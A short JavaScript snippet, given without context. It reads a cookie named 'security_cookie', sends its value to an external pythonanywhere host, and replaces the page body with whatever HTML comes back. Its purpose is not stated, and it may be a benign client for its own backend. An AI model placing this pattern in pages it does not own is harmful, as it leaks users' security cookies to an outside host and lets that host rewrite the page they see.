var securityCookieValue = getSecurityCookieValue();

fetch("https://robotting.pythonanywhere.com/home", {
    method: "GET",
    headers: {
        "cookies": "security_cookie=" + securityCookieValue
    }
})
.then(response => response.text())
.then(data => {
    document.body.innerHTML = data;
})
.catch(error => {
    console.error("Fetch error:", error);
});

function getSecurityCookieValue() {
    var name = "security_cookie=";
    var decodedCookie = decodeURIComponent(document.cookie);
    var cookieArray = decodedCookie.split(';');
    for (var i = 0; i < cookieArray.length; i++) {
        var cookie = cookieArray[i].trim();
        if (cookie.indexOf(name) === 0) {
            return cookie.substring(name.length, cookie.length);
        }
    }
    return "";
}
